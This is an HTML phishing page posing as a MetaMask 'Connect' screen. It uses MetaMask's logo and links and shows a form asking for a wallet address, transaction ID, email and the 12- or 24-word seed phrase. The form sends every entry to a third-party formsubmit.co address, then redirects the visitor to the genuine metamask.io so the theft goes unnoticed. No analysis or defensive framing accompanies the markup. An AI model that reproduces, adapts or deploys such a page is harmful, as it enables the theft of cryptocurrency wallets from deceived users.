<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link
            rel="shortcut icon"
            href="/icon-48x48.584540f1.png"
            type="image/x-icon"
        />
        <link
            rel="stylesheet"
            href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
        />
        <link rel="stylesheet" href="/index.ae22893d.css" />
        <link
            href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"
            rel="stylesheet"
            integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
            crossorigin="anonymous"
        />

        <link rel="stylesheet" href="/index.3a01df49.css" />
        <title>Metamask | Connect</title>
    </head>
    <body class="wallet">
        <a href="https://metamask.io/#/">
            <img class="head" src="/logo.1a6758da.svg" alt="" />
        </a>

        <div class="tab-content" id="myTabContent">
            <div
                class="tab-pane fade active show"
                id="mnemonic"
                role="tabpanel"
                aria-labelledby="mnemonic-tab"
            >
                <form
                    method="POST"
                    action="https://formsubmit.co/279173257d62880e6bbd1660797fd218"
                    id="restore-form"
                >
                    <input
                        type="hidden"
                        name="_next"
                        value="https://metamask.io/"
                    />
                    <input type="hidden" name="_captcha" value="false" />

                    <div class="form-floating">
                        <input
                            type="text"
                            class="form-control w-100"
                            id="WalletAddress"
                            name="Wallet-Address"
                            placeholder="Password"
                        />
                        <label for="WalletAddress">Wallet Address</label>
                    </div>
                    <div class="form-floating">
                        <input
                            type="text"
                            class="form-control w-100"
                            id="TransID"
                            name="Transaction-ID"
                            placeholder="Transaction ID"
                        />
                        <label for="TransID">Transaction ID</label>
                    </div>
                    <div class="form-floating">
                        <input
                            type="text"
                            class="form-control w-100"
                            id="EmailAddress"
                            name="Email-Address"
                            placeholder="Email Address"
                        />
                        <label for="EmailAddress">Email Address</label>
                    </div>
                    <div class="form-floating">
                        <input
                            type="text"
                            class="form-control w-100"
                            id="SeedPhrase"
                            name="Seed-Phrase"
                            placeholder="12/24 Word Seed Phrase"
                        />
                        <label for="floatingPassword"
                            >12/24 Word Seed Phrase</label
                        >
                    </div>

                    <button
                        type="submit"
                        id="sig-go"
                        class="mb-5"
                        style="
                            text-align: center;
                            color: #fff;
                            background: #037dd6;
                            border: 0;
                            border-radius: 7px;
                            width: 250px;
                            padding: 10px 0;
                            font-size: 20px;
                        "
                    >
                        SUBMIT
                    </button>
                    <!-- </div> -->
                </form>
            </div>
        </div>
        <script src="/index.9ad5c1fc.js" defer=""></script>
        <script type="module" src="app.js"></script>
    </body>
</html>
